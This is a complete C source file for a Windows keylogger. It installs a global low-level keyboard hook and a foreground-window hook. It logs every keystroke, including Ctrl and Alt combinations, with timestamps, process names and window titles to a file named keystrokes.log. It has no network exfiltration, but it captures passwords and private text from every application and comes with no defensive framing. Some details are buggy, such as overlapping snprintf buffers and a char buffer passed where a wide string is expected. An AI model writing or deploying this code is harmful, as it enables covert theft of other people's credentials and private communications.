#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

HHOOK           g_keyboard_hook;                // Handle for the keyboard hook.
HWINEVENTHOOK   g_window_hook;                  // Handle for the window event hook.
FILE*           g_logfile;                      // Pointer to the log file.
HWND            g_last_window = NULL;           // Handle to the last recorded window.
HWND            g_foreground_window = NULL;     // Handle to the current foreground window.
char            g_process_name[MAX_PATH] = "";  // Name of the process currently in the foreground.
char            g_window_title[256];            // Title of the current foreground window.

static LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam);
static void CALLBACK handle_fg_window_change(HWINEVENTHOOK, DWORD, HWND, LONG, LONG, DWORD, DWORD);
static void write_to_log(const char* str);
static const char* get_special_key_name(DWORD vkCode);
static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);

int main(int argc, char* argv[])
{
    if (argc == 0 || argv[0] == NULL)
        return 1;

    char log_path[MAX_PATH] = { 0 };

    // Get the full path of the executable file
    // and then find the last backslash in the path
    // to isolate the directory.
    GetModuleFileName(NULL, log_path, MAX_PATH);
    char* last_backslash = strrchr(log_path, '\\');
    if (last_backslash) {
        *last_backslash = '\0';
    }

    // Construct the full path to the log file (keystrokes.log) in the same directory as the executable.
    snprintf(log_path, MAX_PATH, "%s\\keystrokes.log", log_path);

    // Open the log file for appending. Create it if it doesn't exist.
    g_logfile = fopen(log_path, "a");
    if (g_logfile == NULL) {
        return 1;
    }

    // Set a Windows event hook to monitor changes in the foreground window (e.g., when the active window changes).
    g_window_hook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Monitor only foreground window change events.
        NULL,                                               // No DLL handle is needed as the callback is in the same process.
        handle_fg_window_change,                            // The callback function to handle window changes.
        0, 0,                                               // Monitor all processes and threads.
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags to specify how the hook is managed.

    // Set a low-level keyboard hook to monitor all keyboard events.
    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, handle_key_press, NULL, 0);
    if (g_keyboard_hook == NULL || g_window_hook == NULL) {
        fclose(g_logfile);
        return 1;
    }

    // Initialize by manually triggering the window change handler for the current foreground window.
    handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);

    // Enter the message loop to keep the hooks active.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    // Cleanup: Unhook the event and keyboard hooks and close the log file before exiting.
    UnhookWinEvent(g_window_hook);
    UnhookWindowsHookEx(g_keyboard_hook);
    fclose(g_logfile);
    return 0;
}

// Function to remove brackets from a string
static void remove_brackets(char* str)
{
    char* src = str;
    char* dest = str;

    while (*src) {
        if (*src != '[' && *src != ']') {
            *dest++ = *src;
        }
        src++;
    }
    *dest = '\0';
}

static LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Check if the hook should process the event
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;  // Pointer to the keyboard event data
        char key[32] = { 0 };  // Buffer to store the key or key combination

        // Retrieve the current state of all virtual keys
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Check if Shift is pressed and if Caps Lock is active
        BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

        // Check if the key is a printable character or a special key
        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||  // Alphanumeric keys
            pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||  // OEM keys (e.g., punctuation)
            pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE || // Numpad keys
            pKeyboard->vkCode == VK_SPACE) {  // Space key
            // Get the character representation of the key
            strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
        }
        else {  // The key is a special key (e.g., F1, Tab)
            // Get the special key name (e.g., "[Enter]", "[Tab]")
            strcpy(key, get_special_key_name(pKeyboard->vkCode));
        }

        // If no key was identified, pass the event to the next hook
        if (strcmp(key, "") == 0) {
            return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
        }

        // Handle key combinations (e.g., Alt+C, Ctrl+X)
        char tmp_key[32] = { 0 };
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // If Alt key is pressed
            remove_brackets(key);  // Remove brackets from key name if any
            sprintf(tmp_key, "[Alt+%s]", key);  // Format the key combination as "Alt+key"
            strcpy(key, tmp_key);  // Update key with the combination
        }
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {  // If Ctrl key is pressed
            remove_brackets(key);  // Remove brackets from key name if any
            sprintf(tmp_key, "[Ctrl+%s]", key);  // Format the key combination as "Ctrl+key"
            strcpy(key, tmp_key);  // Update key with the combination
        }

        // Write the key or key combination to the log file
        write_to_log(key);
    }

    // Pass the event to the next hook in the chain
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

static void write_to_log(const char* str)
{
    // Check if the foreground window has changed since the last logged window
    if (g_foreground_window != g_last_window) {
        // Update the last window to the current foreground window
        g_last_window = g_foreground_window;

        // Get the current time
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        // Write a new entry to the log file with the timestamp, process name, and window title
        fprintf(g_logfile, "\n>>> %04d-%02d-%02d %02d:%02d:%02d (%s) %s\n",
            tm.tm_year + 1900,   // Year (add 1900 to get the full year)
            tm.tm_mon + 1,       // Month (tm_mon is 0-based, so add 1)
            tm.tm_mday,          // Day of the month
            tm.tm_hour,          // Hour
            tm.tm_min,           // Minute
            tm.tm_sec,           // Second
            g_process_name,      // Name of the current foreground process
            g_window_title);     // Title of the current foreground window
    }

    // Log the key or string that was captured
    fprintf(g_logfile, "%s", str);

    // Ensure all data is written to the file immediately
    fflush(g_logfile);
}

static void CALLBACK handle_fg_window_change(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hwnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime
)
{
    (void)hWinEventHook, event, idObject, idChild, idEventThread, dwmsEventTime;

    // Get the extended window style to check the type of the window
    LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);

    // Check if the window is a tool window (often used for floating palettes, etc.)
    // This is added to avoid logging "Task Switching" when using ALT+TAB
    if (exStyle & WS_EX_TOOLWINDOW) {
        // If the window is a tool window, it's likely not the main application window
        return;
    }

    // Update the global variable with the current foreground window handle
    g_foreground_window = hwnd;

    // Retrieve the process ID associated with the foreground window
    DWORD pid;
    GetWindowThreadProcessId(g_foreground_window, &pid);

    // Open the process to obtain its executable name
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (process) {
        // Get the full path to the executable file of the process
        // and then extract just the file name from the full path
        GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
        strcpy(g_process_name, PathFindFileName(g_process_name));

        CloseHandle(process);
    }

    // Get the title of the foreground window and store it in the global variable
    GetWindowText(hwnd, g_window_title, sizeof(g_window_title));
}

static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
{
    static char key[2] = { 0 };

    // Get the keyboard layout for the current thread.
    HKL keyboardLayout = GetKeyboardLayout(0);

    // Use ToUnicodeEx to translate the virtual key code and scan code into a Unicode character.
    // This function takes into account the keyboard state (e.g., Shift, Caps Lock) and the
    // keyboard layout, which is important for handling different locales and layouts.
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, (LPWSTR)key, sizeof(key), 0, keyboardLayout);

    if (result == 1) {
        // If ToUnicodeEx successfully translated the key (returns 1 when exactly one character is generated),
        // handle the case of uppercase and lowercase conversion based on Shift and Caps Lock states.

        if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
            // If either Shift is pressed without Caps Lock, or Caps Lock is on without Shift,
            // convert the character to uppercase.
            key[0] = (char)toupper(key[0]);
        }
        else if (!isShiftPressed && !isCapsLockOn) {
            // If neither Shift nor Caps Lock is active, ensure the character is lowercase.
            key[0] = (char)tolower(key[0]);
        }
		key[1] = '\0';  // Null-terminate the string.
		printf("%s\n", key);
    }
    else {
        // If ToUnicodeEx did not return exactly one character, return a placeholder for an unknown key.
        return "[Unknown Key]";
    }

    return key;
}

// Function to get the name of special keys (e.g., F1, Tab, Enter)
static const char* get_special_key_name(DWORD vkCode)
{
    switch (vkCode) {
    case VK_TAB: return "[Tab]";
    case VK_RETURN: return "[Enter]";
    case VK_BACK: return "[Backspace]";
    case VK_CAPITAL: return "";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return "[Space]";
    case VK_PRIOR: return "[Page Up]";
    case VK_NEXT: return "[Page Down]";
    case VK_END: return "[End]";
    case VK_HOME: return "[Home]";
    case VK_LEFT: return "[Left Arrow]";
    case VK_UP: return "[Up Arrow]";
    case VK_RIGHT: return "[Right Arrow]";
    case VK_DOWN: return "[Down Arrow]";
    case VK_INSERT: return "[Insert]";
    case VK_DELETE: return "[Delete]";
    case VK_LWIN: return "[Left Windows]";
    case VK_RWIN: return "[Right Windows]";
    case VK_APPS: return "[Application]";
    case VK_SLEEP: return "[Sleep]";
    case VK_NUMPAD0: return "[Numpad 0]";
    case VK_NUMPAD1: return "[Numpad 1]";
    case VK_NUMPAD2: return "[Numpad 2]";
    case VK_NUMPAD3: return "[Numpad 3]";
    case VK_NUMPAD4: return "[Numpad 4]";
    case VK_NUMPAD5: return "[Numpad 5]";
    case VK_NUMPAD6: return "[Numpad 6]";
    case VK_NUMPAD7: return "[Numpad 7]";
    case VK_NUMPAD8: return "[Numpad 8]";
    case VK_NUMPAD9: return "[Numpad 9]";
    case VK_MULTIPLY: return "[Numpad *]";
    case VK_ADD: return "[Numpad +]";
    case VK_SEPARATOR: return "[Numpad Separator]";
    case VK_SUBTRACT: return "[Numpad -]";
    case VK_DECIMAL: return "[Numpad .]";
    case VK_DIVIDE: return "[Numpad /]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    case VK_NUMLOCK: return "[Num Lock]";
    case VK_SCROLL: return "[Scroll Lock]";
    case VK_LSHIFT: return "";
    case VK_RSHIFT: return "";
    case VK_LCONTROL: return "";
    case VK_RCONTROL: return "";
    case VK_LMENU: return "";
    case VK_RMENU: return "";
    case VK_VOLUME_MUTE: return "[Volume Mute]";
    case VK_VOLUME_DOWN: return "[Volume Down]";
    case VK_VOLUME_UP: return "[Volume Up]";
    case VK_MEDIA_NEXT_TRACK: return "[Next Track]";
    case VK_MEDIA_PREV_TRACK: return "[Previous Track]";
    case VK_MEDIA_STOP: return "[Stop Media]";
    case VK_MEDIA_PLAY_PAUSE: return "[Play/Pause Media]";
    case VK_LAUNCH_MAIL: return "[Launch Mail]";
    case VK_LAUNCH_MEDIA_SELECT: return "[Launch Media Select]";
    case VK_LAUNCH_APP1: return "[Launch App 1]";
    case VK_LAUNCH_APP2: return "[Launch App 2]";
    case VK_BROWSER_BACK: return "[Browser Back]";
    case VK_BROWSER_FORWARD: return "[Browser Forward]";
    case VK_BROWSER_REFRESH: return "[Browser Refresh]";
    case VK_BROWSER_STOP: return "[Browser Stop]";
    case VK_BROWSER_SEARCH: return "[Browser Search]";
    case VK_BROWSER_FAVORITES: return "[Browser Favorites]";
    case VK_BROWSER_HOME: return "[Browser Home]";
    case VK_OEM_1: return "[OEM 1 (;:)]";
    case VK_OEM_PLUS: return "[OEM Plus (+)]";
    case VK_OEM_COMMA: return "[OEM Comma (,)]";
    case VK_OEM_MINUS: return "[OEM Minus (-)]";
    case VK_OEM_PERIOD: return "[OEM Period (.)]";
    case VK_OEM_2: return "[OEM 2 (/?) ]";
    case VK_OEM_3: return "[OEM 3 (`~)]";
    case VK_OEM_4: return "[OEM 4 ([{)]";
    case VK_OEM_5: return "[OEM 5 (\\|)]";
    case VK_OEM_6: return "[OEM 6 (]}])]";
    case VK_OEM_7: return "[OEM 7 ('\") ]";
    case VK_OEM_8: return "[OEM 8]";
    case VK_OEM_102: return "[OEM 102 (<|>)]";
    default: return "[Unknown Key]";
    }
}
